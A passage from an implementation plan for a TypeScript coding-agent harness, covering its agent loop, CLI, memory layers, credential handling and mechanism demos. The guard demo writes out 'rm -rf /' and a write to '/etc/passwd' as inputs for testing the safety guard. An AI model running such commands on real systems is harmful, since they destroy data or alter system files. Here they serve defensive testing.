      content: `Relevant project memory:\n${memoryContent}`,
    };

    const systemIdx = messages.findIndex(m => m.role === 'system');
    const insertAt = systemIdx >= 0 ? systemIdx + 1 : 0;

    const result = [...messages];
    result.splice(insertAt, 0, memoryMsg);
    return result;
  }
}
```

- [ ] **Step 4: Create src/memory/compressor.ts**

```typescript
import type { Message } from '../types';

const CHARS_PER_TOKEN = 4;

export class Compressor {
  compress(messages: Message[], maxTokens: number, mode: 'truncate' | 'summarize'): Message[] {
    const maxChars = maxTokens * CHARS_PER_TOKEN;
    const currentChars = estimateTokens(messages) * CHARS_PER_TOKEN;
    if (currentChars <= maxChars) return messages;

    if (mode === 'summarize') {
      return this.compressTruncate(messages, maxChars);
    }

    return this.compressTruncate(messages, maxChars);
  }

  private compressTruncate(messages: Message[], maxChars: number): Message[] {
    const systemMsg = messages.find(m => m.role === 'system');
    const nonSystem = messages.filter(m => m.role !== 'system');
    const keepLast = Math.max(2, Math.floor(nonSystem.length / 2));

    const result: Message[] = [];
    if (systemMsg) result.push(systemMsg);

    const leading = nonSystem.slice(0, nonSystem.length - keepLast);
    if (leading.length > 0) {
      result.push({ role: 'system', content: '...[earlier messages truncated]...' });
    }

    result.push(...nonSystem.slice(-keepLast));
    return result;
  }
}

function estimateTokens(messages: Message[]): number {
  return messages.reduce((sum, m) => sum + (m.content ? m.content.length / CHARS_PER_TOKEN : 0), 0);
}
```

- [ ] **Step 5: Run tests to verify pass**

```bash
npx vitest run tests/memory/context-injector.test.ts tests/memory/compressor.test.ts
```
Expected: 5 tests PASS.

- [ ] **Step 6: Commit**

```bash
git add src/memory/context-injector.ts src/memory/compressor.ts tests/memory/context-injector.test.ts tests/memory/compressor.test.ts
git commit -m "feat: add context injector and compressor for memory management"
```


### Task 15: Main Agent Loop

**Files:**
- Create: `src/core/loop.ts`
- Test: `tests/core/loop.test.ts`

**Interfaces:**
- Consumes: All previous modules (LLM, parser, guard, executor, feedback, memory)
- Produces: `runLoop(task: string, config: Config, llm: LLMProvider, memory: MemoryManager, registry: ToolRegistry): Promise<LoopResult>`

- [ ] **Step 1: Write failing test (mock LLM driven)**

Create `tests/core/loop.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { runLoop } from '../../src/core/loop';
import { MockLLMProvider } from '../../src/core/llm/mock';
import { ToolRegistry } from '../../src/tools/registry';
import type { Config } from '../../src/config/types';
import type { Tool } from '../../src/tools/types';
import type { ToolResult } from '../../src/types';

class FakeWriteFileTool implements Tool {
  definition = { type: 'function' as const, function: { name: 'write_file', description: 'Write file', parameters: { type: 'object', properties: { filePath: { type: 'string' }, content: { type: 'string' } }, required: ['filePath', 'content'] } } };
  async execute(): Promise<ToolResult> { return { tool: 'write_file', stdout: 'ok', stderr: '', exitCode: 0, success: true }; }
}

class FakeRunTestTool implements Tool {
  definition = { type: 'function' as const, function: { name: 'run_test', description: 'Run tests', parameters: { type: 'object', properties: {} } } };
  async execute(): Promise<ToolResult> { return { tool: 'run_test', stdout: '3 passed, 0 failed', stderr: '', exitCode: 0, success: true }; }
}

const config: Config = {
  llm: { provider: 'mock', model: 'mock', maxTokens: 4096, temperature: 0.1 },
  loop: { maxIterations: 10, maxContextTokens: 128000, maxConsecutiveFailures: 3 },
  tools: { workspaceRoot: '/tmp/test', allowedCommands: [], blockedPatterns: [] },
  memory: { sessionDbPath: ':memory:', projectDbPath: ':memory:', workingMemoryRounds: 10, sessionMemoryExpireDays: 30, retrievalTopK: 5 },
};

describe('runLoop', () => {
  it('should complete a simple task with mock LLM', async () => {
    const mock = new MockLLMProvider('script', [
      {
        inputContains: 'test',
        response: {
          content: null,
          toolCalls: [{ id: 'c1', type: 'function' as const, function: { name: 'write_file', arguments: '{"filePath":"test.ts","content":"code"}' } }],
          finishReason: 'tool_calls' as const,
        },
      },
      {
        inputContains: 'write_file',
        response: {
          content: null,
          toolCalls: [{ id: 'c2', type: 'function' as const, function: { name: 'run_test', arguments: '{}' } }],
          finishReason: 'tool_calls' as const,
        },
      },
      {
        inputContains: 'run_test',
        response: { content: 'All tests pass!', toolCalls: [], finishReason: 'stop' as const },
      },
    ]);

    const registry = new ToolRegistry();
    registry.register(new FakeWriteFileTool());
    registry.register(new FakeRunTestTool());

    const result = await runLoop('run test', config, mock, registry);
    expect(result.success).toBe(true);
    expect(result.iterations).toBeGreaterThanOrEqual(2);
  });

  it('should stop after max iterations', async () => {
    const mock = new MockLLMProvider('script', Array.from({ length: 15 }, () => ({
      inputContains: '',
      response: { content: 'thinking...', toolCalls: [], finishReason: 'stop' as const },
    })));

    const registry = new ToolRegistry();
    const result = await runLoop('task', config, mock, registry);
    expect(result.success).toBe(false);
    expect(result.reason).toContain('max_iterations');
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/loop.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/core/loop.ts**

```typescript
import type { LoopResult, Message, Action } from '../types';
import type { Config } from '../config/types';
import type { LLMProvider, ToolDefinition } from './llm/types';
import type { ToolRegistry } from '../tools/registry';
import { parseAction } from './parser';
import { checkGuard } from './guard';
import { executeAction } from './executor';
import { validateFeedback } from './feedback';
import { randomUUID } from 'crypto';

export async function runLoop(
  task: string,
  config: Config,
  llm: LLMProvider,
  registry: ToolRegistry
): Promise<LoopResult> {
  const sessionId = randomUUID();
  const messages: Message[] = [
    {
      role: 'system',
      content: `You are a coding agent. You can read/write files, execute shell commands, and run tests.
Work in workspace: ${config.tools.workspaceRoot}
When tests pass, say "All tests pass" and stop.
When tests fail, fix the code and run tests again.`,
    },
    { role: 'user', content: task },
  ];

  const tools: ToolDefinition[] = registry.getDefinitions();
  let consecutiveFailures = 0;

  for (let i = 0; i < config.loop.maxIterations; i++) {
    const response = await llm.chat({ messages, tools, maxTokens: config.llm.maxTokens, temperature: config.llm.temperature });

    const action = parseAction(response);

    if (action.type === 'stop') {
      return { success: true, reason: action.reason || 'Task completed', iterations: i + 1 };
    }

    if (action.type === 'invalid') {
      messages.push({ role: 'assistant', content: null });
      messages.push({ role: 'tool', content: `Error: ${action.reason || 'Invalid action'}`, toolCallId: 'error' });
      continue;
    }

    const guardResult = checkGuard(action, config.tools.workspaceRoot);
    if (guardResult.blocked) {
      messages.push({ role: 'assistant', content: null });
      messages.push({ role: 'tool', content: `BLOCKED: ${guardResult.reason}`, toolCallId: 'guard' });
      continue;
    }
    if (guardResult.requiresApproval) {
      messages.push({ role: 'assistant', content: null });
      messages.push({ role: 'tool', content: `APPROVAL REQUIRED: ${guardResult.reason}. User denied.`, toolCallId: 'guard' });
      continue;
    }

    const tc = response.toolCalls[0];
    messages.push({
      role: 'assistant',
      content: null,
      toolCalls: [tc],
    });

    let toolResult;
    try {
      toolResult = await executeAction(action, registry, { workspaceRoot: config.tools.workspaceRoot });
    } catch (err: any) {
      toolResult = { tool: action.tool || 'unknown', stdout: '', stderr: err.message, exitCode: 1, success: false };
    }

    messages.push({
      role: 'tool',
      content: toolResult.stdout || toolResult.stderr || '',
      toolCallId: tc.id,
    });

    const feedback = validateFeedback(toolResult);

    if (feedback.verdict === 'pass') {
      return { success: true, reason: feedback.summary, iterations: i + 1 };
    }

    if (feedback.verdict === 'fail') {
      consecutiveFailures++;
      if (consecutiveFailures >= config.loop.maxConsecutiveFailures) {
        return { success: false, reason: `Max consecutive failures (${config.loop.maxConsecutiveFailures}) reached`, iterations: i + 1 };
      }
      const fbMsg = `TEST FAILED: ${feedback.summary}\n${feedback.failures?.map(f => `- ${f.testName}: ${f.error}`).join('\n') || ''}\nPlease fix the code and try again.`;
      messages.push({ role: 'user', content: fbMsg });
    } else {
      consecutiveFailures = 0;
    }
  }

  return { success: false, reason: 'max_iterations_reached', iterations: config.loop.maxIterations };
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/core/loop.test.ts
```
Expected: 2 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/loop.ts tests/core/loop.test.ts
git commit -m "feat: add main agent loop with mock-LLM-driven integration test"
```


### Task 16: CLI Entry Point

**Files:**
- Modify: `src/index.ts`
- Test: `tests/cli.test.ts`

**Interfaces:**
- Consumes: `runLoop` from Task 15, `loadConfig` from Task 2, `createLLMProvider` from Task 6, `ToolRegistry` from Task 9
- Produces: CLI with `harness run <task>` command

- [ ] **Step 1: Write failing test**

Create `tests/cli.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { execSync } from 'child_process';

describe('CLI', () => {
  it('should show help', () => {
    const output = execSync('node dist/index.js --help', { encoding: 'utf-8' });
    expect(output).toContain('Usage');
    expect(output).toContain('run');
  });

  it('should show version', () => {
    const output = execSync('node dist/index.js --version', { encoding: 'utf-8' });
    expect(output.trim()).toMatch(/^\d+\.\d+\.\d+/);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npm run build && npx vitest run tests/cli.test.ts
```
Expected: FAIL -- CLI not implemented.

- [ ] **Step 3: Rewrite src/index.ts**

```typescript
#!/usr/bin/env node

import { Command } from 'commander';
import { loadConfig } from './config/loader';
import { createLLMProvider } from './core/llm/factory';
import { runLoop } from './core/loop';
import { ToolRegistry } from './tools/registry';
import { readFileTool } from './tools/read-file';
import { writeFileTool } from './tools/write-file';
import { shellTool } from './tools/shell';
import { runTestTool } from './tools/run-test';
import chalk from 'chalk';

const program = new Command();

program
  .name('harness')
  .description('Coding Agent Harness - AI-powered coding assistant')
  .version('1.0.0');

program
  .command('run <task>')
  .description('Run a coding task')
  .option('-c, --config <path>', 'Path to config file')
  .action(async (task: string, options: { config?: string }) => {
    const config = loadConfig();
    console.log(chalk.blue(`[Harness] Starting task: ${task}`));
    console.log(chalk.gray(`[Harness] Provider: ${config.llm.provider}, Model: ${config.llm.model}`));

    const apiKeys = loadApiKeys();
    const llm = createLLMProvider(config, apiKeys);

    const registry = new ToolRegistry();
    registry.register(readFileTool);
    registry.register(writeFileTool);
    registry.register(shellTool);
    registry.register(runTestTool);
    console.log(chalk.gray(`[Harness] Registered ${registry.getDefinitions().length} tools`));

    const startTime = Date.now();
    const result = await runLoop(task, config, llm, registry);
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);

    if (result.success) {
      console.log(chalk.green(`[Harness] Task completed in ${result.iterations} iterations (${elapsed}s)`));
    } else {
      console.log(chalk.red(`[Harness] Task failed: ${result.reason} (${result.iterations} iterations, ${elapsed}s)`));
    }
  });

function loadApiKeys(): Record<string, string> {
  const keys: Record<string, string> = {};
  if (process.env.OPENAI_API_KEY) keys['openai'] = process.env.OPENAI_API_KEY;
  if (process.env.ANTHROPIC_API_KEY) keys['anthropic'] = process.env.ANTHROPIC_API_KEY;
  if (process.env.OPENAI_COMPAT_API_KEY) keys['openai-compat'] = process.env.OPENAI_COMPAT_API_KEY;
  return keys;
}

program.parse();
```

- [ ] **Step 4: Build and run tests**

```bash
npm run build && npx vitest run tests/cli.test.ts
```
Expected: 2 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/index.ts tests/cli.test.ts
git commit -m "feat: add CLI entry point with commander"
```

---

### Task 17: L3 Project Memory (Vector Store and Retriever)

**Files:**
- Create: `src/memory/project-store.ts`, `src/memory/project-retriever.ts`
- Test: `tests/memory/project-store.test.ts`, `tests/memory/project-retriever.test.ts`

**Interfaces:**
- Consumes: Memory types from Task 10
- Produces: `ProjectStore` class, `ProjectRetriever` class with cosine similarity search

- [ ] **Step 1: Write failing tests**

Create `tests/memory/project-store.test.ts`:

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { ProjectStore } from '../../src/memory/project-store';

describe('ProjectStore', () => {
  let store: ProjectStore;

  beforeEach(() => {
    store = new ProjectStore(':memory:');
  });

  it('should insert and retrieve entries', () => {
    const id = store.insert({
      type: 'file_summary',
      path: 'src/index.ts',
      content: 'CLI entry point',
      embedding: new Float32Array([0.1, 0.2, 0.3]),
      timestamp: Date.now(),
    });
    const entry = store.getById(id);
    expect(entry).toBeDefined();
    expect(entry!.content).toBe('CLI entry point');
  });

  it('should get all entries', () => {
    store.insert({ type: 'file_summary', path: 'a.ts', content: 'A', embedding: new Float32Array([1, 0]), timestamp: 1000 });
    store.insert({ type: 'file_summary', path: 'b.ts', content: 'B', embedding: new Float32Array([0, 1]), timestamp: 2000 });
    expect(store.getAll()).toHaveLength(2);
  });

  it('should delete entries', () => {
    const id = store.insert({ type: 'file_summary', path: 'a.ts', content: 'A', embedding: new Float32Array([1, 0]), timestamp: 1000 });
    store.delete(id);
    expect(store.getById(id)).toBeUndefined();
  });
});
```

Create `tests/memory/project-retriever.test.ts`:

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { ProjectStore } from '../../src/memory/project-store';
import { ProjectRetriever } from '../../src/memory/project-retriever';

describe('ProjectRetriever', () => {
  let store: ProjectStore;
  let retriever: ProjectRetriever;

  beforeEach(() => {
    store = new ProjectStore(':memory:');
    retriever = new ProjectRetriever(store);
  });

  it('should find similar entries by cosine similarity', async () => {
    store.insert({ type: 'file_summary', path: 'calc.ts', content: 'Calculator module', embedding: new Float32Array([1.0, 0.0, 0.0]), timestamp: 1000 });
    store.insert({ type: 'file_summary', path: 'unrelated.ts', content: 'Unrelated', embedding: new Float32Array([0.0, 0.0, 1.0]), timestamp: 2000 });

    const query = new Float32Array([1.0, 0.1, 0.0]);
    const results = await retriever.retrieve(query, 2);
    expect(results).toHaveLength(2);
    expect(results[0].content).toBe('Calculator module');
  });

  it('should respect topK limit', async () => {
    for (let i = 0; i < 5; i++) {
      store.insert({ type: 'file_summary', path: `f${i}.ts`, content: `F${i}`, embedding: new Float32Array([i * 0.1, 0.5]), timestamp: i * 1000 });
    }
    const query = new Float32Array([0.5, 0.5]);
    const results = await retriever.retrieve(query, 3);
    expect(results).toHaveLength(3);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/memory/project-store.test.ts tests/memory/project-retriever.test.ts
```
Expected: FAIL -- modules not found.

- [ ] **Step 3: Create src/memory/project-store.ts**

```typescript
import Database from 'better-sqlite3';
import { randomUUID } from 'crypto';

export interface ProjectMemoryEntry {
  id: string;
  type: 'file_summary' | 'module_summary' | 'fix_pattern';
  path: string;
  content: string;
  embedding: Float32Array;
  timestamp: number;
}

export class ProjectStore {
  private db: Database.Database;

  constructor(dbPath: string) {
    this.db = new Database(dbPath);
    this.db.exec(`
      CREATE TABLE IF NOT EXISTS project_memory (
        id TEXT PRIMARY KEY,
        type TEXT NOT NULL,
        path TEXT NOT NULL,
        content TEXT NOT NULL,
        embedding BLOB NOT NULL,
        timestamp INTEGER NOT NULL
      );
    `);
  }

  insert(entry: Omit<ProjectMemoryEntry, 'id'>): string {
    const id = randomUUID();
    const stmt = this.db.prepare('INSERT INTO project_memory (id, type, path, content, embedding, timestamp) VALUES (?, ?, ?, ?, ?, ?)');
    stmt.run(id, entry.type, entry.path, entry.content, Buffer.from(entry.embedding.buffer), entry.timestamp);
    return id;
  }

  getById(id: string): ProjectMemoryEntry | undefined {
    return this.db.prepare('SELECT * FROM project_memory WHERE id = ?').get(id) as ProjectMemoryEntry | undefined;
  }

  getAll(): ProjectMemoryEntry[] {
    return this.db.prepare('SELECT * FROM project_memory ORDER BY timestamp DESC').all() as ProjectMemoryEntry[];
  }

  delete(id: string): void {
    this.db.prepare('DELETE FROM project_memory WHERE id = ?').run(id);
  }

  close(): void {
    this.db.close();
  }
}
```

- [ ] **Step 4: Create src/memory/project-retriever.ts**

```typescript
import type { ProjectStore, ProjectMemoryEntry } from './project-store';

export class ProjectRetriever {
  private store: ProjectStore;

  constructor(store: ProjectStore) {
    this.store = store;
  }

  async retrieve(queryEmbedding: Float32Array, topK: number = 3): Promise<ProjectMemoryEntry[]> {
    const entries = this.store.getAll();
    if (entries.length === 0) return [];

    const scored = entries.map(entry => {
      const emb = new Float32Array((entry.embedding as unknown as Buffer).buffer);
      const similarity = cosineSimilarity(queryEmbedding, emb);
      return { entry, similarity };
    });

    scored.sort((a, b) => b.similarity - a.similarity);
    return scored.slice(0, topK).map(s => s.entry);
  }
}

function cosineSimilarity(a: Float32Array, b: Float32Array): number {
  if (a.length !== b.length) {
    const minLen = Math.min(a.length, b.length);
    let dot = 0, normA = 0, normB = 0;
    for (let i = 0; i < minLen; i++) {
      dot += a[i] * b[i];
      normA += a[i] * a[i];
      normB += b[i] * b[i];
    }
    if (normA === 0 || normB === 0) return 0;
    return dot / (Math.sqrt(normA) * Math.sqrt(normB));
  }

  let dot = 0, normA = 0, normB = 0;
  for (let i = 0; i < a.length; i++) {
    dot += a[i] * b[i];
    normA += a[i] * a[i];
    normB += b[i] * b[i];
  }
  if (normA === 0 || normB === 0) return 0;
  return dot / (Math.sqrt(normA) * Math.sqrt(normB));
}
```

- [ ] **Step 5: Run tests to verify pass**

```bash
npx vitest run tests/memory/project-store.test.ts tests/memory/project-retriever.test.ts
```
Expected: 5 tests PASS.

- [ ] **Step 6: Commit**

```bash
git add src/memory/project-store.ts src/memory/project-retriever.ts tests/memory/project-store.test.ts tests/memory/project-retriever.test.ts
git commit -m "feat: add L3 project memory with vector store and cosine similarity retrieval"
```


### Task 18: MemoryManager Facade

**Files:**
- Create: `src/memory/index.ts`
- Test: `tests/memory/memory-manager.test.ts`

**Interfaces:**
- Consumes: All memory modules from Tasks 10, 13, 14, 17
- Produces: `MemoryManager` class that wraps all memory layers

- [ ] **Step 1: Write failing test**

Create `tests/memory/memory-manager.test.ts`:

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { MemoryManager } from '../../src/memory';

describe('MemoryManager', () => {
  let mm: MemoryManager;

  beforeEach(() => {
    mm = new MemoryManager({ sessionDbPath: ':memory:', projectDbPath: ':memory:', workingMemoryRounds: 10, sessionMemoryExpireDays: 30, retrievalTopK: 5 });
  });

  it('should record and retrieve session memory', async () => {
    mm.record('session-1', 'convention', 'Use tabs', { language: 'ts' }, 'tabs,indentation');
    const results = await mm.retrieve('tabs', 'session-1');
    expect(results).toHaveLength(1);
    expect(results[0].content).toBe('Use tabs');
  });

  it('should inject context into messages', async () => {
    mm.record('session-1', 'convention', 'Use tabs for indentation', {}, 'tabs,indentation');
    const messages = [
      { role: 'system' as const, content: 'System prompt' },
      { role: 'user' as const, content: 'Write code with tabs' },
    ];
    const injected = await mm.injectContext(messages, 'session-1');
    expect(injected.length).toBeGreaterThanOrEqual(3);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/memory/memory-manager.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/memory/index.ts**

```typescript
import type { MemoryConfig } from '../config/types';
import type { Message } from '../types';
import type { SessionMemoryEntry } from './types';
import type { ProjectMemoryEntry } from './project-store';
import { WorkingMemory } from './working-memory';
import { SessionStore } from './session-store';
import { SessionRetriever } from './session-retriever';
import { ProjectStore } from './project-store';
import { ProjectRetriever } from './project-retriever';
import { ContextInjector } from './context-injector';
import { Compressor } from './compressor';

export class MemoryManager {
  private workingMemory: WorkingMemory;
  private sessionStore: SessionStore;
  private sessionRetriever: SessionRetriever;
  private projectStore: ProjectStore;
  private projectRetriever: ProjectRetriever;
  private contextInjector: ContextInjector;
  private compressor: Compressor;

  constructor(config: MemoryConfig) {
    this.workingMemory = new WorkingMemory(config.workingMemoryRounds);
    this.sessionStore = new SessionStore(config.sessionDbPath);
    this.sessionRetriever = new SessionRetriever(this.sessionStore);
    this.projectStore = new ProjectStore(config.projectDbPath);
    this.projectRetriever = new ProjectRetriever(this.projectStore);
    this.contextInjector = new ContextInjector(this.sessionRetriever, this.workingMemory);
    this.compressor = new Compressor();
  }

  record(sessionId: string, type: SessionMemoryEntry['type'], content: string, metadata: Record<string, unknown> = {}, keywords: string = ''): void {
    this.sessionStore.insert({
      sessionId,
      type,
      content,
      metadata: JSON.stringify(metadata),
      keywords: keywords || extractBasicKeywords(content),
      timestamp: Date.now(),
      confidence: 1.0,
    });
  }

  async retrieve(query: string, sessionId: string): Promise<SessionMemoryEntry[]> {
    return this.sessionRetriever.retrieve(query, 5);
  }

  async injectContext(messages: Message[], sessionId: string): Promise<Message[]> {
    return this.contextInjector.inject(messages, sessionId);
  }

  getWorkingMemory(): WorkingMemory {
    return this.workingMemory;
  }

  getSessionStore(): SessionStore {
    return this.sessionStore;
  }

  getProjectStore(): ProjectStore {
    return this.projectStore;
  }

  close(): void {
    this.sessionStore.close();
    this.projectStore.close();
  }
}

function extractBasicKeywords(text: string): string {
  return text.toLowerCase().split(/\s+/).filter(w => w.length > 2).join(',');
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/memory/memory-manager.test.ts
```
Expected: 2 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/memory/index.ts tests/memory/memory-manager.test.ts
git commit -m "feat: add MemoryManager facade for all memory layers"
```

---

### Task 19: Credential Management

**Files:**
- Create: `src/credentials/store.ts`, `src/credentials/retrieve.ts`, `src/credentials/prompt.ts`, `src/credentials/manager.ts`
- Test: `tests/credentials/manager.test.ts`

**Interfaces:**
- Produces: `CredentialManager` with `set(provider, key)`, `get(provider): string | null`, `has(provider): boolean`, `delete(provider)`, `status(): Record<string, 'configured' | 'not configured'>`

- [ ] **Step 1: Write failing test**

Create `tests/credentials/manager.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { CredentialManager } from '../../src/credentials/manager';

describe('CredentialManager', () => {
  it('should store and retrieve keys in memory', () => {
    const cm = new CredentialManager();
    cm.set('openai', 'sk-test-123');
    expect(cm.has('openai')).toBe(true);
    expect(cm.get('openai')).toBe('sk-test-123');
  });

  it('should return null for missing key', () => {
    const cm = new CredentialManager();
    expect(cm.get('unknown')).toBeNull();
  });

  it('should delete keys', () => {
    const cm = new CredentialManager();
    cm.set('openai', 'sk-test');
    cm.delete('openai');
    expect(cm.has('openai')).toBe(false);
  });

  it('should report status without exposing keys', () => {
    const cm = new CredentialManager();
    cm.set('openai', 'sk-test');
    const status = cm.status();
    expect(status['openai']).toBe('configured');
    expect(status['anthropic']).toBe('not configured');
    expect(JSON.stringify(status)).not.toContain('sk-test');
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/credentials/manager.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/credentials/manager.ts**

```typescript
export class CredentialManager {
  private keys = new Map<string, string>();

  set(provider: string, key: string): void {
    this.keys.set(provider, key);
  }

  get(provider: string): string | null {
    return this.keys.get(provider) || null;
  }

  has(provider: string): boolean {
    return this.keys.has(provider);
  }

  delete(provider: string): void {
    this.keys.delete(provider);
  }

  status(): Record<string, 'configured' | 'not configured'> {
    const providers = ['openai', 'anthropic', 'openai-compat'];
    const result: Record<string, 'configured' | 'not configured'> = {};
    for (const p of providers) {
      result[p] = this.has(p) ? 'configured' : 'not configured';
    }
    return result;
  }
}
```

- [ ] **Step 4: Create placeholder files for keytar integration**

Create `src/credentials/store.ts`:

```typescript
export async function storeInKeychain(provider: string, key: string): Promise<void> {
  try {
    const keytar = require('keytar');
    await keytar.setPassword('coding-agent-harness', provider, key);
  } catch {
    // keytar not available, fall back to env var
  }
}
```

Create `src/credentials/retrieve.ts`:

```typescript
export async function retrieveFromKeychain(provider: string): Promise<string | null> {
  try {
    const keytar = require('keytar');
    return await keytar.getPassword('coding-agent-harness', provider);
  } catch {
    return null;
  }
}
```

Create `src/credentials/prompt.ts`:

```typescript
import { createInterface } from 'readline';

export async function promptForKey(provider: string): Promise<string> {
  const rl = createInterface({ input: process.stdin, output: process.stdout });
  return new Promise(resolve => {
    process.stdout.write(`Enter API key for ${provider}: `);
    const onData = (char: Buffer) => {
      const c = char.toString();
      if (c === '\r' || c === '\n') {
        process.stdin.removeListener('data', onData);
        process.stdin.setRawMode(false);
        rl.close();
        console.log('');
        resolve('');
      }
    };
    let input = '';
    process.stdin.setRawMode(true);
    process.stdin.on('data', (data: Buffer) => {
      const str = data.toString();
      if (str === '\r' || str === '\n') {
        process.stdin.removeListener('data', onData);
        process.stdin.setRawMode(false);
        rl.close();
        process.stdout.write('\n');
        resolve(input);
      } else if (str === '\u0003') {
        process.exit(0);
      } else {
        input += str;
        process.stdout.write('*');
      }
    });
  });
}
```

- [ ] **Step 5: Run tests to verify pass**

```bash
npx vitest run tests/credentials/manager.test.ts
```
Expected: 4 tests PASS.

- [ ] **Step 6: Commit**

```bash
git add src/credentials/ tests/credentials/
git commit -m "feat: add credential management with in-memory store and keytar integration"
```


### Task 20: Mechanism Demos (Guard, Feedback, Memory)

**Files:**
- Create: `demos/guard-demo.ts`, `demos/feedback-demo.ts`, `demos/memory-demo.ts`
- Test: `tests/demos.test.ts` (runs all demos)

**Interfaces:**
- Consumes: `checkGuard` from Task 8, `validateFeedback` from Task 12, `MemoryManager` from Task 18

- [ ] **Step 1: Write demo runner test**

Create `tests/demos.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { execSync } from 'child_process';

describe('Mechanism Demos', () => {
  it('should run guard demo successfully', () => {
    const output = execSync('npx tsx demos/guard-demo.ts', { encoding: 'utf-8' });
    expect(output).toContain('PASS');
    expect(output).toContain('guard');
  }, 15000);

  it('should run feedback demo successfully', () => {
    const output = execSync('npx tsx demos/feedback-demo.ts', { encoding: 'utf-8' });
    expect(output).toContain('PASS');
    expect(output).toContain('feedback');
  }, 15000);

  it('should run memory demo successfully', () => {
    const output = execSync('npx tsx demos/memory-demo.ts', { encoding: 'utf-8' });
    expect(output).toContain('PASS');
    expect(output).toContain('memory');
  }, 15000);
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/demos.test.ts
```
Expected: FAIL -- demos not found.

- [ ] **Step 3: Create demos/guard-demo.ts**

```typescript
import { checkGuard } from '../src/core/guard';
import type { Action } from '../src/types';

let passed = 0;
let failed = 0;

function assert(condition: boolean, name: string): void {
  if (condition) { console.log(`  PASS: ${name}`); passed++; }
  else { console.log(`  FAIL: ${name}`); failed++; }
}

console.log('=== Guard Demo ===');

const dangerousAction: Action = { type: 'tool_call', tool: 'shell', args: { command: 'rm -rf /' } };
const result = checkGuard(dangerousAction, '/workspace');
assert(result.requiresApproval === true, 'rm -rf / requires approval');
assert(result.blocked === false, 'rm -rf / is not blocked');
assert(result.reason?.includes('rm -rf') ?? false, 'reason mentions rm -rf');

const safeAction: Action = { type: 'tool_call', tool: 'shell', args: { command: 'npm test' } };
const result2 = checkGuard(safeAction, '/workspace');
assert(result2.requiresApproval === false, 'npm test does not require approval');
assert(result2.blocked === false, 'npm test is not blocked');

const outsideWrite: Action = { type: 'tool_call', tool: 'write_file', args: { filePath: '/etc/passwd' } };
const result3 = checkGuard(outsideWrite, '/workspace');
assert(result3.blocked === true, 'write outside workspace is blocked');

const insideWrite: Action = { type: 'tool_call', tool: 'write_file', args: { filePath: '/workspace/test.ts' } };
const result4 = checkGuard(insideWrite, '/workspace');
assert(result4.blocked === false, 'write inside workspace is allowed');

console.log(`\nResults: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
```

- [ ] **Step 4: Create demos/feedback-demo.ts**

```typescript
import { validateFeedback } from '../src/core/feedback';
import type { ToolResult } from '../src/types';

let passed = 0;
let failed = 0;

function assert(condition: boolean, name: string): void {
  if (condition) { console.log(`  PASS: ${name}`); passed++; }
  else { console.log(`  FAIL: ${name}`); failed++; }
}

console.log('=== Feedback Demo ===');

const failResult: ToolResult = {
  tool: 'run_test',
  stdout: `FAIL  src/calc.test.ts
  x multiply(2, 3) should return 6
    Expected: 6
    Received: 5
Tests: 1 failed, 1 total`,
  stderr: '',
  exitCode: 1,
  success: false,
};

const fb = validateFeedback(failResult);
assert(fb.verdict === 'fail', 'verdict is fail');
assert(fb.shouldStop === false, 'shouldStop is false');
assert(fb.failures !== undefined, 'failures array exists');
assert(fb.failures!.length > 0, 'failures array is non-empty');
assert(fb.failures![0].testName.includes('multiply'), 'test name is parsed');

const passResult: ToolResult = {
  tool: 'run_test',
  stdout: '3 passed, 0 failed',
  stderr: '',
  exitCode: 0,
  success: true,
};

const fb2 = validateFeedback(passResult);
assert(fb2.verdict === 'pass', 'verdict is pass');
assert(fb2.shouldStop === true, 'shouldStop is true');

const neutralResult: ToolResult = {
  tool: 'write_file',
  stdout: 'ok',
  stderr: '',
  exitCode: 0,
  success: true,
};

const fb3 = validateFeedback(neutralResult);
assert(fb3.verdict === 'neutral', 'verdict is neutral');
assert(fb3.shouldStop === false, 'shouldStop is false for neutral');

console.log(`\nResults: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
```

- [ ] **Step 5: Create demos/memory-demo.ts**

```typescript
import { MemoryManager } from '../src/memory';

let passed = 0;
let failed = 0;

function assert(condition: boolean, name: string): void {
  if (condition) { console.log(`  PASS: ${name}`); passed++; }
  else { console.log(`  FAIL: ${name}`); failed++; }
}

async function main() {
  console.log('=== Memory Demo ===');

  const mm = new MemoryManager({
    sessionDbPath: ':memory:',
    projectDbPath: ':memory:',
    workingMemoryRounds: 10,
    sessionMemoryExpireDays: 30,
    retrievalTopK: 5,
  });

  mm.record('demo-session', 'convention', 'Use tabs for indentation', {}, 'tabs,indentation,formatting');
  mm.record('demo-session', 'decision', 'Use vitest as test runner', {}, 'vitest,testing');

  const results = await mm.retrieve('indentation', 'demo-session');
  assert(results.length > 0, 'retrieves indentation convention');
  assert(results[0].content === 'Use tabs for indentation', 'correct content retrieved');

  const messages = [
    { role: 'system' as const, content: 'You are a coding agent.' },
    { role: 'user' as const, content: 'Write code with tabs' },
  ];

  const injected = await mm.injectContext(messages, 'demo-session');
  assert(injected.length > messages.length, 'context injected');
  assert(injected.some(m => m.content?.includes('Use tabs')), 'injected content contains convention');

  mm.close();
  console.log(`\nResults: ${passed} passed, ${failed} failed`);
